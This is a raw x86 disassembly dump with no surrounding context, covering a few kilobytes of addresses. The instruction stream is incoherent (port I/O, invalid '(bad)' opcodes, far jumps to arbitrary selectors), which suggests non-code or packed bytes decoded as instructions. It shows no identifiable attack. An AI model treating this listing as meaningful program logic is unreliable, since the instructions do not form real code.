  4251b8:	dec    ecx
  4251b9:	mov    ch,dh
  4251bb:	mov    esi,0xb1c6f287
  4251c0:	js     0x425186
  4251c2:	es aad 0x17
  4251c5:	push   ecx
  4251c6:	test   BYTE PTR [ecx-0x3664da50],bl
  4251cc:	and    DWORD PTR [edi+0x7f462dd6],ebx
  4251d2:	sub    eax,0x1381cc57
  4251d7:	pop    DWORD PTR [eax*8+0x1fdb233a]
  4251de:	xchg   ebp,eax
  4251df:	out    dx,al
  4251e0:	repnz add eax,0x49de8464
  4251e6:	sbb    ebp,edi
  4251e8:	mov    DWORD PTR [ebx-0x1c634f97],0x132a6276
  4251f2:	data16 sbb dh,BYTE PTR [ebx]
  4251f5:	push   0x65
  4251f7:	xor    ebx,DWORD PTR [ecx+0x165a7c6b]
  4251fd:	inc    esi
  4251fe:	or     edi,eax
  425200:	mov    ecx,0xb0bad78f
  425205:	test   DWORD PTR [ebx+0x6d],ebx
  425208:	popa   
  425209:	sub    ah,ch
  42520b:	inc    esp
  42520c:	push   edi
  42520d:	ins    DWORD PTR es:[edi],dx
  42520e:	psubusb mm5,QWORD PTR [ebx-0x54]
  425212:	icebp  
  425213:	outs   dx,BYTE PTR ds:[esi]
  425214:	lods   eax,DWORD PTR ds:[esi]
  425215:	fidiv  WORD PTR [edx]
  425217:	pop    ss
  425218:	sbb    eax,0xfdb92f8f
  42521d:	es xchg ebx,eax
  42521f:	ja     0x42522b
  425221:	ret    0xc699
  425224:	sub    al,0xd7
  425226:	daa    
  425227:	ins    DWORD PTR es:[edi],dx
  425228:	in     eax,dx
  425229:	inc    ebp
  42522a:	stos   DWORD PTR es:[edi],eax
  42522b:	clc    
  42522c:	cmp    BYTE PTR [eax-0x111abe75],ch
  425232:	das    
  425233:	jle    0x4251c3
	...
  425295:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42529c:	mov    ebp,0x2e2083e6
  4252a1:	add    eax,0xbd902fcf
  4252a6:	cmc    
  4252a7:	mov    eax,DWORD PTR [ecx]
  4252a9:	add    BYTE PTR [edi],al
  4252ab:	add    DWORD PTR [eax],eax
  4252ad:	add    BYTE PTR [ebp-0x29],ch
  4252b0:	jp     0x42531e
  4252b2:	mov    edi,0xf0b3ebe4
  4252b7:	mov    ecx,0x3f1c957c
  4252bc:	pop    esi
  4252bd:	mov    ecx,0x6d4e914c
  4252c2:	sbb    ecx,esi
  4252c4:	setno  BYTE PTR [edi-0x74]
  4252c8:	xor    al,0xe1
  4252ca:	(bad)  
  4252cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4252cc:	push   edx
  4252cd:	mov    dh,0xa7
  4252cf:	in     eax,0x32
  4252d1:	push   ss
  4252d2:	mov    cl,dl
  4252d4:	dec    edx
  4252d5:	add    ch,cl
  4252d7:	nop
  4252d8:	and    ah,BYTE PTR [ecx-0x4d2512e1]
  4252de:	repz jl 0x425286
  4252e1:	sbb    ecx,DWORD PTR [ebx+0x63]
  4252e4:	repnz cwde 
  4252e6:	push   esp
  4252e7:	call   DWORD PTR [edx]
  4252e9:	sub    DWORD PTR [eax],ebx
  4252eb:	(bad)  
  4252ed:	dec    ebp
  4252ee:	into   
  4252ef:	retf   0xbe2a
  4252f2:	push   0xffffffbc
  4252f4:	pop    esp
  4252f5:	into   
  4252f6:	cmp    al,ch
  4252f8:	mov    BYTE PTR [eax+0x24],0xc
  4252fc:	mov    WORD PTR [ebx-0x34],gs
  4252ff:	fcmovnb st,st(0)
  425301:	dec    ebx
  425303:	pop    ds
  425304:	mov    ecx,0x5c34e29a
  425309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42530a:	adc    DWORD PTR [eax],0xffffffcc
  42530d:	aas    
  42530e:	sub    cl,ch
  425310:	mov    cl,bh
  425312:	pop    edx
  425313:	jmp    0x2ae6d043
  425318:	cli    
  425319:	scas   eax,DWORD PTR es:[edi]
  42531a:	add    al,0x2f
  42531c:	sub    dl,BYTE PTR [ecx+0x6]
  42531f:	mov    edi,0xf92b550a
  425324:	out    dx,eax
  425325:	xor    DWORD PTR [edx],0xfffffff8
  425328:	sbb    DWORD PTR [ebp+0x35bb099f],edi
  42532e:	or     bl,BYTE PTR [esi]
  425330:	sbb    DWORD PTR [esi-0x58505e0b],edi
  425336:	icebp  
  425337:	popa   
  425338:	jne    0x425387
  42533a:	push   esi
  42533b:	sar    al,0xf3
  42533e:	push   esi
  42533f:	xchg   BYTE PTR [edx+0x7e],dl
  425342:	and    cl,BYTE PTR [edi]
  425344:	loopne 0x42536b
  425346:	cli    
  425347:	fsubr  st(0),st
  425349:	pusha  
  42534a:	sub    cl,dh
  42534c:	fucomp st(5)
  42534e:	cmp    al,0xda
  425350:	push   ds
  425351:	cmp    edx,ecx
  425353:	shr    DWORD PTR [edx-0x27],0x9b
  425357:	js     0x42532c
  425359:	mov    ecx,0xc940faff
  42535e:	sub    eax,0xfc2f56ca
  425363:	(bad)  [ebp-0x3aa7087c]
  425369:	jecxz  0x425329
  42536b:	nop
  42536c:	xchg   edx,eax
  42536d:	push   edi
  42536e:	lods   eax,DWORD PTR ds:[esi]
  42536f:	adc    eax,0x31d00caa
  425374:	sub    esp,DWORD PTR [ecx-0x1200b8e6]
  42537a:	out    dx,al
  42537b:	out    0xe2,al
  42537d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42537e:	xlat   BYTE PTR ds:[ebx]
  42537f:	outs   dx,DWORD PTR ds:[esi]
  425380:	mov    al,ds:0x5b71834f
  425385:	(bad)  
  425386:	sub    DWORD PTR [ecx],ecx
  425388:	push   ss
  425389:	xor    DWORD PTR [edx-0x5c],edi
  42538c:	jns    0x42538b
  42538e:	push   0xfcbefea3
  425393:	jbe    0x425372
  425395:	jae    0x42534b
  425397:	shr    cl,0xff
  42539a:	ss data16 fwait
  42539d:	mov    dl,0xf
  42539f:	sub    ah,cl
  4253a1:	sbb    dl,BYTE PTR [ebx+ebx*1]
  4253a4:	ja     0x4253f9
  4253a6:	or     edi,DWORD PTR [ebp+0x40d9c03e]
  4253ac:	ficomp DWORD PTR [esi-0x6c]
  4253af:	lock mov eax,0x5707a5f
	...
  425415:	add    BYTE PTR [edx+0x9],al
  425418:	les    ebp,FWORD PTR [ecx-0x14901231]
  42541e:	out    0xf4,eax
  425420:	xchg   al,bl
  425422:	retf   0xea53
  425425:	or     eax,0x18cfc
  42542a:	pop    es
  42542b:	add    DWORD PTR [eax],eax
  42542d:	add    BYTE PTR [ebp+0x67],cl
  425430:	out    dx,eax
  425431:	dec    edx
  425432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425433:	mov    eax,ds:0x62138e93
  425438:	add    esp,DWORD PTR [edx]
  42543a:	cdq    
  42543b:	sar    DWORD PTR [edx],cl
  42543d:	xchg   DWORD PTR [edi],ebp
  42543f:	arpl   WORD PTR [ebx-0x687e9482],ax
  425445:	(bad)  
  425446:	mov    ch,0x67
  425448:	sbb    cl,BYTE PTR ds:0xa6d192a1
  42544e:	xchg   esi,eax
  42544f:	pushf  
  425450:	xchg   ebx,eax
  425451:	int    0x9d
  425453:	xchg   DWORD PTR [esi+0x606df4c2],esi
  425459:	popf   
  42545a:	popa   
  42545b:	push   ebx
  42545c:	cmp    BYTE PTR fs:[ebp+0x678f2aee],al
  425463:	aaa    
  425464:	jo     0x4253f9
  425466:	js     0x4253f1
  425468:	out    0x5b,eax
  42546a:	sbb    eax,0x39369f79
  42546f:	loope  0x42549c
  425471:	cmp    bh,ch
  425473:	dec    ebx
  425474:	mov    bl,0xa3
  425476:	adc    ch,ah
  425478:	add    al,0x59
  42547a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42547b:	repnz cmp dh,BYTE PTR [edx+0x7fd9504b]
  425482:	enter  0x9f55,0xf7
  425486:	add    BYTE PTR [edi+0x3271b990],bl
  42548c:	sbb    al,0x93
  42548e:	fld    TBYTE PTR [ebx]
  425490:	inc    esp
  425491:	or     bh,al
  425493:	daa    
  425494:	cmp    dh,BYTE PTR [edx]
  425496:	cs pop edx
  425498:	sub    al,0x7e
  42549a:	jmp    0x2341:0x80026a21
  4254a1:	jecxz  0x4254f1
  4254a3:	jae    0x4254f9
  4254a5:	call   0xecf3:0xc95a1bdb
  4254ac:	and    DWORD PTR [ebx],0xffffffaf
  4254af:	adc    al,0x88
  4254b1:	adc    DWORD PTR [esi+0x2518fcf5],esp
  4254b7:	push   cs
  4254b8:	hlt    
  4254b9:	aad    0xf0
  4254bb:	lods   eax,DWORD PTR ds:[esi]
  4254bc:	xchg   BYTE PTR [ebx+0x22],ch
  4254bf:	fld    DWORD PTR [ecx]
  4254c1:	mov    edx,DWORD PTR [esi+0x22fee65]
  4254c7:	jae    0x4254df
  4254c9:	mov    ds:0x979e8000,al
  4254ce:	mov    eax,ds:0xbb299d0
  4254d3:	call   0xde26:0x6c0fdb56
  4254da:	dec    ebx
  4254db:	pop    ecx
  4254dc:	out    dx,eax
  4254dd:	and    BYTE PTR [edi-0x31ffa70f],0x1a
  4254e4:	inc    edi
  4254e5:	cwde   
  4254e6:	shr    BYTE PTR [ebx],cl
  4254e8:	test   DWORD PTR [edx],edx
  4254ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254eb:	cli    
  4254ec:	cdq    
  4254ed:	push   ecx
  4254ee:	fwait
  4254ef:	or     ah,BYTE PTR [esi+0x33]
  4254f2:	sub    eax,0x71c37654
  4254f7:	and    DWORD PTR [edx+esi*2],0xffffffa6
  4254fb:	add    ebp,DWORD PTR [edi+0x23]
  4254fe:	pop    esi
  4254ff:	push   ebx
  425500:	repz inc ecx
  425502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425503:	loopne 0x425575
  425505:	sub    eax,DWORD PTR [eax+ebp*2+0x20]
  425509:	(bad)  
  42550a:	xor    al,0x80
  42550c:	int    0x97
  42550e:	retf   
  42550f:	xchg   ebp,eax
  425510:	scas   eax,DWORD PTR es:[edi]
  425511:	mov    ah,0x10
  425513:	mov    ch,BYTE PTR [esi-0x1637fcd6]
  425519:	fsubr  DWORD PTR [eax+0x66]
  42551c:	test   al,0x8d
  42551e:	mov    dl,0x0
  425520:	and    ah,BYTE PTR [esi-0x13]
  425523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425524:	shl    ebp,0x98
  425527:	out    0x44,al
  425529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42552a:	or     esp,DWORD PTR [ebx-0x2e1c029d]
  425530:	mov    dl,0x44
  425532:	enter  0xf813,0x0
	...
  425596:	(bad)  
  425597:	jmp    0xfef4:0xfe6e7a4e
  42559e:	dec    esp
  42559f:	push   ecx
  4255a0:	ret    0x17c6
  4255a3:	scas   eax,DWORD PTR es:[edi]
  4255a4:	fisub  WORD PTR [eax+0x3]
  4255a7:	mov    es,WORD PTR [ecx]
  4255a9:	add    BYTE PTR [edi],al
  4255ab:	add    DWORD PTR [eax],eax
  4255ad:	add    bl,ch
  4255af:	jmp    0x8cc5:0xc578fc82
  4255b6:	(bad)  
  4255b7:	out    0xc1,eax
  4255b9:	cmp    eax,edi
  4255bb:	daa    
  4255bc:	ds (bad) 
  4255be:	aad    0x1a
  4255c0:	add    DWORD PTR [edx],0x8031085c
  4255c6:	out    dx,al
  4255c7:	cs ret 0x7890
  4255cb:	ret    
  4255cc:	rcr    BYTE PTR [eax+0x7fadd45e],cl
  4255d2:	push   edi
  4255d3:	rcr    BYTE PTR [ebx-0x7e],0x7e
  4255d7:	mov    ah,0xd5
  4255d9:	mov    edx,0x4cb0292d
  4255de:	or     ch,BYTE PTR [ebp+0x2474f5c]
  4255e4:	stos   DWORD PTR es:[edi],eax
  4255e5:	out    0x5d,eax
  4255e7:	mov    BYTE PTR [eax-0x7c961e40],bl
  4255ed:	adc    DWORD PTR [edi+0x6208342e],ecx
  4255f3:	push   edx
  4255f4:	mov    ch,0x10
  4255f6:	dec    eax
  4255f7:	mov    BYTE PTR gs:[edx-0x5c],bh
  4255fb:	dec    ebx
  4255fd:	mov    eax,ds:0xfd44aba5
  425602:	pop    ebp
  425603:	mov    al,ds:0xfc568883
  425608:	jo     0x425610
  42560a:	in     eax,dx
  42560b:	lods   eax,DWORD PTR ds:[esi]
  42560c:	mov    ebx,0x285cbd72
  425611:	inc    ebp
  425612:	pop    ds
  425613:	lahf   
  425614:	jb     0x425627
  425616:	adc    DWORD PTR [esi-0x6f],esp
  425619:	adc    ch,BYTE PTR [bx+si]
  42561c:	mov    bh,0x33
  42561e:	push   eax
  42561f:	xor    ecx,DWORD PTR [edx+0x625a10a5]
  425625:	push   0x10ba32ea
  42562a:	push   eax
  42562b:	int3   
  42562c:	and    al,0xe4
  42562e:	and    dl,BYTE PTR [ecx+0x58]
  425631:	fadd   DWORD PTR [ebp+ebx*1-0x3072f975]
  425638:	fwait
  425639:	cmc    
  42563a:	xchg   edi,eax
  42563b:	lods   eax,DWORD PTR ds:[esi]
  42563c:	xor    esp,DWORD PTR [eax+0x35]
  42563f:	mov    ds:0x8a9213d9,eax
  425644:	call   0x3764:0x2b03cec4
  42564b:	or     DWORD PTR [edi+edx*1-0x3782592d],0xffffffea
  425653:	pop    ebx
  425654:	sbb    DWORD PTR [eax],esp
  425656:	fild   DWORD PTR [edi]
  425658:	push   0x19
  42565a:	mov    edx,0xdc53222
  42565f:	lea    ebx,[eax-0x30]
  425662:	lods   eax,DWORD PTR ds:[esi]
  425663:	push   esp
  425664:	(bad)  
  425665:	imul   DWORD PTR [esi]
  425667:	xchg   ecx,eax
  425668:	mov    dh,0xd3
  42566a:	jne    0x42565f
  42566c:	stos   DWORD PTR es:[edi],eax
  42566d:	sbb    al,0x3
  42566f:	sbb    bl,BYTE PTR [ebx+0x2cd24e13]
  425675:	fdiv   QWORD PTR [edi+0x5a]
  425678:	xor    al,0xbe
  42567a:	stos   BYTE PTR es:[edi],al
  42567b:	jge    0x425679
  42567d:	icebp  
  42567e:	retf   
  42567f:	icebp  
  425680:	add    eax,0xcd329c0c
  425685:	add    eax,0x30af9fc4
  42568a:	ret    0x13d5
  42568d:	jae    0x4256c5
  42568f:	pop    esp
  425690:	mov    bl,0xc7
  425692:	and    eax,0x5fc061b0
  425697:	fdivr  DWORD PTR [eax]
  425699:	sub    dh,BYTE PTR [ebx]
  42569b:	mov    bh,ch
  42569d:	cmc    
  42569e:	mov    eax,DWORD PTR ds:0xaa4a9b14
  4256a4:	mov    bh,0x2b
  4256a6:	cmp    BYTE PTR [ecx+0x5268c496],cl
  4256ac:	dec    edx
  4256ad:	sbb    eax,0x3f240aa
  4256b2:	adc    bh,BYTE PTR [edi+0x43]
	...
  425714:	add    BYTE PTR [eax],al
  425716:	(bad)  
  425717:	aaa    
  425718:	shl    BYTE PTR [ebx+esi*8],cl
  42571b:	cmc    
  42571c:	div    bh
  42571e:	mov    dl,0x28
  425720:	shr    DWORD PTR [ebx+0x57b62f71],cl
  425726:	or     cl,BYTE PTR [edi+0x1070001]
  42572c:	add    BYTE PTR [eax],al
  42572e:	mov    eax,0x5a3f9e5a
  425733:	add    cl,BYTE PTR [eax-0x548af64b]
  425739:	pop    esp
  42573a:	sbb    eax,0x3d5b8be1
  42573f:	dec    ebx
  425740:	aam    0xf0
  425742:	stos   DWORD PTR es:[edi],eax
  425743:	push   ds
  425744:	daa    
  425745:	std    
  425746:	fstp   TBYTE PTR [ecx]
  425748:	or     eax,DWORD PTR [edi-0x2d550dfe]
  42574e:	mov    ds:0x8238f99a,eax
  425753:	jnp    0x42575c
  425755:	xlat   BYTE PTR ds:[ebx]
  425756:	out    0x16,al
  425758:	fadd   st(7),st
  42575a:	repnz inc esi
  42575c:	sub    al,0xc8
  42575e:	test   DWORD PTR [ebx],ebx
  425760:	outs   dx,DWORD PTR ds:[esi]
  425761:	dec    edx
  425762:	loopne 0x42571a
  425764:	jns    0x4256e8
  425766:	cmp    BYTE PTR [edi],0xa6
  425769:	sbb    eax,0x2776e2c9
  42576e:	sub    DWORD PTR [ebx],edi
  425770:	out    0xb8,eax
  425772:	outs   dx,BYTE PTR ds:[esi]
  425773:	aas    
  425774:	ret    
  425775:	fcomp  QWORD PTR [edx+0x6d]
  425778:	ja     0x42578a
  42577a:	lock nop
  42577c:	sub    edx,DWORD PTR [ecx]
  42577e:	imul   ecx,DWORD PTR [ebp+0x7c],0x928278cd
  425785:	or     ecx,edx
  425787:	stos   DWORD PTR es:[edi],eax
  425788:	aam    0x6a
  42578a:	test   BYTE PTR [ebx+ecx*1],cl
  42578d:	pop    edx
  42578e:	mov    dl,0x14
  425790:	sbb    eax,0xc8b4de4a
  425795:	xchg   ecx,eax
  425796:	xchg   DWORD PTR [esi+ebx*2-0x3f1a40c6],esi
  42579d:	and    DWORD PTR [esi+0x22],edi
  4257a0:	ins    BYTE PTR es:[edi],dx
  4257a1:	imul   esi,DWORD PTR [edi+edi*2+0x36],0x5f03396b
  4257a9:	retf   
  4257aa:	(bad)  
  4257ac:	push   edx
  4257ad:	addr16 xchg ebp,eax
  4257af:	cmp    eax,0x6cae91f8
  4257b4:	cmp    DWORD PTR [ebp-0x80],0x11a51c33
  4257bb:	in     eax,dx
  4257bc:	adc    DWORD PTR [edx+ebx*4+0x4],ebx
  4257c0:	bound  edi,QWORD PTR [eax-0x6a]
  4257c3:	in     al,dx
  4257c4:	jae    0x4257f3
  4257c6:	fimul  DWORD PTR fs:[ebx+0x5c]
  4257ca:	push   esp
  4257cb:	jmp    0x98bc:0xa58ec795
  4257d2:	or     esi,edi
  4257d4:	jg     0x425833
  4257d6:	sub    cl,BYTE PTR cs:[eax+eax*4+0x69]
  4257db:	(bad)  
  4257dc:	test   al,0x54
  4257de:	cli    
  4257df:	mov    ch,0xb
  4257e1:	retfw  0x886b
  4257e5:	mov    ds:0x4749a189,eax
  4257ea:	sbb    DWORD PTR [esi],ebx
  4257ec:	pop    ebp
  4257ed:	es jp  0x425805
  4257f0:	jp     0x42583f
  4257f2:	xor    dl,dl
  4257f4:	popf   
  4257f5:	mov    esp,0x90e5351d
  4257fa:	inc    eax
  4257fb:	xchg   ecx,eax
  4257fc:	mov    esp,0xd9a18ee2
  425801:	sbb    eax,0xe9b93d3d
  425806:	inc    edi
  425807:	enter  0x1ac1,0x9e
  42580b:	xchg   esi,eax
  42580c:	stc    
  42580d:	dec    esi
  42580e:	inc    esi
  42580f:	sbb    eax,0x2e706230
  425814:	mov    WORD PTR [edi+0x653fe597],es
  42581a:	in     eax,dx
  42581b:	jg     0x42580f
  42581d:	push   edx
  42581e:	leave  
  42581f:	sbb    DWORD PTR [ebx-0x1b],ecx
  425822:	popf   
  425823:	mov    DWORD PTR ds:0xe799ffd5,ebp
  425829:	pop    ecx
  42582a:	les    esp,FWORD PTR [ebx+0x4e]
  42582d:	push   0x32
  42582f:	xchg   eax,esp
  425831:	pop    eax
  425832:	pop    edi
  425833:	clc    
  425834:	stc    
	...
  425895:	add    BYTE PTR [edx+edx*2-0x70],bl
  425899:	push   edx
  42589a:	sahf   
  42589b:	rcr    dh,cl
  42589d:	pop    esi
  42589e:	inc    eax
  42589f:	scas   eax,DWORD PTR es:[edi]
  4258a0:	stc    
  4258a1:	mov    ds:0x23119fe5,al
  4258a6:	adc    DWORD PTR [eax+0x1070001],edx
  4258ac:	add    BYTE PTR [eax],al
  4258ae:	sbb    BYTE PTR [ebp+0x55f6180b],dl
  4258b4:	pop    es
  4258b5:	xchg   ecx,eax
  4258b6:	ins    BYTE PTR es:[edi],dx
  4258b7:	popf   
  4258b8:	fild   WORD PTR [ecx-0x71]
  4258bb:	mov    ds:0xf51c1038,eax
  4258c0:	mov    al,0x8d
  4258c2:	rol    ah,1
  4258c4:	add    eax,0x1c0c3b94
  4258c9:	cmp    al,0xc4
  4258cb:	sub    dl,al
  4258cd:	xchg   BYTE PTR [esi-0x60],bh
  4258d0:	arpl   bp,bx
  4258d2:	pop    esp
  4258d3:	or     DWORD PTR [ebp+0x22],edx
  4258d6:	push   ds
  4258d7:	inc    ecx
  4258d8:	adc    bl,BYTE PTR [edi-0x71e28361]
  4258de:	xor    DWORD PTR [edx],esi
  4258e0:	jg     0x4258bf
  4258e2:	popa   
  4258e3:	pop    ecx
  4258e4:	in     eax,0x80
  4258e6:	pop    ebx
  4258e7:	mov    al,ds:0xc2a2c41b
  4258ec:	loop   0x4258a5
  4258ee:	loop   0x425952
  4258f0:	pop    edx
  4258f1:	cmc    
  4258f2:	psrlw  mm7,mm3
  4258f5:	jp     0x4258b1
  4258f7:	and    BYTE PTR [eiz*4+0x4317fdbe],dl
  4258fe:	jge    0x4258aa
  425900:	das    
  425901:	mov    ebp,DWORD PTR [ebp+0x44]
  425904:	mov    WORD PTR [ebx],ds
  425906:	push   0x3560ee58
  42590b:	nop
  42590c:	ret    0xa472
  42590f:	push   edi
  425910:	xchg   edi,eax
  425911:	mov    ebp,0xf4bc6033
  425916:	lea    ebx,[esi-0x8]
  425919:	in     eax,0x6e
  42591b:	or     ch,BYTE PTR [eax]
  42591d:	xchg   ebp,eax
  42591e:	sbb    ecx,DWORD PTR [edi-0x6d]
  425921:	scas   al,BYTE PTR es:[edi]
  425922:	and    DWORD PTR [edi+edi*8],edx
  425925:	push   ecx
  425926:	mov    ch,0x51
  425928:	mov    ebx,0x56cd71f0
  42592d:	cmp    al,0x3b
  425930:	dec    eax
  425931:	jb     0x42593f
  425933:	fisttp DWORD PTR ds:0x4a124f92
  425939:	addr16 cmp ebx,ebp
  42593c:	and    ecx,esp
  42593e:	mov    ch,BYTE PTR [eax-0x7bd2c514]
  425944:	inc    esi
  425945:	int3   
  425946:	pushf  
  425947:	and    bh,BYTE PTR ds:0xf3d1ee06
  42594d:	shr    DWORD PTR [ebx-0x2],cl
  425950:	cmp    DWORD PTR ds:0x5bd1f6d8,0x74
  425957:	ror    ecx,1
  425959:	jne    0x425946
  42595b:	mov    al,0xc0
  42595d:	ror    DWORD PTR [ecx],1
  42595f:	push   ss
  425960:	add    dh,BYTE PTR [esi]
  425962:	add    al,0x2f
  425964:	and    DWORD PTR [esi],edx
  425966:	out    0x79,eax
  425968:	pop    ds
  425969:	cmp    BYTE PTR [ecx-0x4216466c],bh
  42596f:	into   
  425970:	jae    0x4259e0
  425972:	push   0xffffffee
  425974:	pop    ebx
  425975:	call   0x8365ed95
  42597a:	jnp    0x4259bd
  42597c:	test   al,0x49
  42597e:	inc    edi
  42597f:	inc    edi
  425980:	sbb    eax,0xfc477020
  425985:	cmp    BYTE PTR [ecx+0x30],ch
  425988:	cmp    dl,ah
  42598a:	out    0x23,eax
  42598c:	pop    ds
  42598d:	fisub  DWORD PTR [esi+0x40b3dbf9]
  425993:	push   ds
  425994:	cmp    dl,BYTE PTR [eax]
  425996:	into   
  425997:	scas   al,BYTE PTR es:[edi]
  425998:	ins    BYTE PTR es:[edi],dx
  425999:	mov    cl,0x8c
  42599b:	sub    al,0x80
  42599d:	addr16 cdq 
  42599f:	(bad)  
  4259a0:	fsub   DWORD PTR [eax]
  4259a2:	sahf   
  4259a3:	or     edx,esp
  4259a5:	ret    0x6884
  4259a8:	inc    ebx
  4259a9:	xchg   esi,eax
  4259aa:	pushf  
  4259ab:	cmp    eax,0xa3a85350
  4259b0:	arpl   di,dx
  4259b2:	add    esi,ecx
  4259b4:	lods   al,BYTE PTR ds:[esi]
	...
  425a15:	add    cl,al
  425a17:	arpl   WORD PTR [edi+eiz*2],ax
  425a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a1b:	jcxz   0x425a05
  425a1e:	mov    edi,0x4849fe11
  425a24:	gs dec esi
  425a26:	sbb    BYTE PTR [ecx+0x1070001],dl
  425a2c:	add    BYTE PTR [eax],al
  425a2e:	push   esp
  425a2f:	add    DWORD PTR [edx-0x4fafe43b],ebx
  425a35:	les    edx,FWORD PTR [edi]
  425a37:	cwde   
  425a38:	xchg   esp,eax
  425a39:	pop    edx
  425a3a:	mov    DWORD PTR [ebx-0x141f541a],0x89353028
  425a44:	push   edx
  425a45:	sar    BYTE PTR [eax-0x4f42cd0f],cl
  425a4b:	jecxz  0x425a31
  425a4d:	xor    al,BYTE PTR [ecx]
  425a4f:	pop    edi
  425a50:	sub    BYTE PTR [esi-0x37],dh
  425a53:	(bad)  
  425a54:	in     eax,0x24
  425a56:	aaa    
  425a57:	jle    0x4259e7
  425a59:	dec    esp
  425a5a:	push   eax
  425a5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a5c:	icebp  
  425a5d:	jge    0x4259f1
  425a5f:	add    esi,ecx
  425a61:	pop    esi
  425a62:	rcl    ebx,1
  425a64:	and    eax,0x22eb576f
  425a69:	fst    st(6)
  425a6b:	xor    edx,DWORD PTR ds:0x6c38c7ce
  425a71:	sub    al,0xd7
  425a73:	jnp    0x425a2b
  425a75:	sbb    BYTE PTR [eax],cl
  425a77:	xchg   ebx,eax
  425a78:	jo     0x425a5b
  425a7a:	aad    0xfb
  425a7c:	ror    BYTE PTR [ecx+0x270f3497],cl
  425a82:	and    ah,BYTE PTR [edi]
  425a84:	pop    es
  425a85:	xchg   edi,eax
  425a86:	fadd   DWORD PTR [ebx+0x2173921e]
  425a8c:	xor    DWORD PTR [esi-0x3bb74071],ecx
  425a92:	push   0xffffffa3
  425a94:	xchg   ebx,eax
  425a95:	jns    0x425a5e
  425a97:	shr    DWORD PTR [esi-0x34f61dc6],0xa1
  425a9e:	pop    ebp
  425a9f:	pop    ebp
  425aa0:	pop    esi
  425aa1:	and    dl,cl
  425aa3:	sahf   
  425aa4:	pop    ss
  425aa5:	push   ecx
  425aa6:	mov    eax,ds:0x4f30edff
  425aab:	or     DWORD PTR [eax-0x53],edx
  425aae:	mov    WORD PTR [ecx-0x2c],ss
  425ab1:	xor    DWORD PTR [ebp-0x72c62bc7],0xf788200
  425abb:	jp     0x425b19
  425abd:	repnz xor eax,0x101dc5d8
  425ac3:	in     eax,dx
  425ac4:	or     BYTE PTR [edx-0x5e],0x6f
  425ac8:	xchg   ebp,eax
  425ac9:	fimul  DWORD PTR [edi+eax*2+0x5a]
  425acd:	int    0xb
  425acf:	mov    BYTE PTR [ecx+edi*8-0x68],bh
  425ad3:	sub    al,0x48
  425ad5:	jmp    DWORD PTR [ecx+ebx*8-0x1f11f784]
  425adc:	sbb    dh,ah
  425ade:	push   ds
  425adf:	scas   eax,DWORD PTR es:[edi]
  425ae0:	std    
  425ae1:	stc    
  425ae2:	cmp    BYTE PTR [edi+0x3697a363],cl
  425ae8:	and    DWORD PTR ds:[ecx+0x24],edx
  425aec:	stos   BYTE PTR es:[edi],al
  425aed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425aee:	lods   al,BYTE PTR ds:[esi]
  425aef:	ret    
  425af0:	mov    WORD PTR [ecx],?
  425af2:	jns    0x425a96
  425af4:	das    
  425af5:	test   al,0xad
  425af7:	sbb    edx,edx
  425af9:	mov    BYTE PTR [edx+0x77],dl
  425afc:	mov    eax,0x1b0ffe9
  425b01:	inc    esi
  425b02:	ds jg  0x425aaa
  425b05:	sub    al,BYTE PTR [ebx+esi*8-0x10a1eb2b]
  425b0c:	add    BYTE PTR [eax-0x55522866],0x81
  425b13:	push   esp
  425b14:	(bad)  
  425b18:	pop    esp
  425b19:	dec    esi
  425b1a:	mov    ds:0x16edcf9b,al
  425b1f:	retf   
  425b20:	ret    0x6394
  425b23:	pop    es
  425b24:	jno    0x425b02
  425b26:	sbb    eax,0x96ae472f
  425b2b:	adc    eax,0x98023d32
  425b30:	sbb    al,0x9d
  425b32:	outs   dx,BYTE PTR ds:[esi]
  425b33:	das    
  425b34:	hlt    
	...
  425b95:	add    ah,al
  425b97:	clc    
  425b98:	jnp    0x425bf0
  425b9a:	jg     0x425b73
  425b9c:	in     eax,dx
  425b9d:	cli    
  425b9e:	push   0xa8a5aad3
  425ba3:	jbe    0x425be9
  425ba5:	adc    al,0x1f
  425ba7:	xchg   edx,eax
  425ba8:	add    DWORD PTR [eax],eax
  425baa:	pop    es
  425bab:	add    DWORD PTR [eax],eax
  425bad:	add    BYTE PTR [eax+0x5c],bl
  425bb0:	xchg   dh,ch
  425bb2:	xchg   esi,eax
  425bb3:	retf   0x2e12
  425bb6:	daa    
  425bb7:	inc    edx
  425bb8:	stos   DWORD PTR es:[edi],eax
  425bb9:	or     eax,0xb2a85f2e
  425bbe:	xchg   ebp,eax
  425bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425bc0:	mov    edi,0x7f4c33af
  425bc5:	stos   DWORD PTR es:[edi],eax
  425bc6:	(bad)  
  425bc7:	mov    bh,0x9c
  425bc9:	jg     0x425bcb
  425bcb:	ret    
  425bcc:	sbb    DWORD PTR [esi+0x24],edi
  425bcf:	push   ecx
  425bd0:	inc    esi
  425bd1:	pop    edi
  425bd2:	repnz rol DWORD PTR [edx],1
  425bd5:	xor    ebp,eax
  425bd7:	daa    
  425bd8:	lahf   
  425bd9:	aaa    
  425bda:	clc    
  425bdb:	adc    eax,0xbb8ea16c
  425be0:	ja     0x425bfe
  425be2:	test   DWORD PTR [esi+0x47],esp
  425be5:	cmp    BYTE PTR [ebp+0x48],ch
  425be8:	outs   dx,DWORD PTR ds:[esi]
  425be9:	jbe    0x425be9
  425beb:	sbb    edi,ecx
  425bed:	and    ch,ch
  425bef:	push   esi
  425bf0:	mov    ds:0x7068cf7e,eax
  425bf5:	inc    ecx
  425bf6:	jecxz  0x425bff
  425bf8:	mov    ebp,0x8f418853
  425bfd:	or     eax,0xa787683e
  425c02:	call   0xd467:0x21a4c2df
  425c09:	jb     0x425bf5
  425c0b:	lods   eax,DWORD PTR ds:[esi]
  425c0c:	xchg   esi,esp
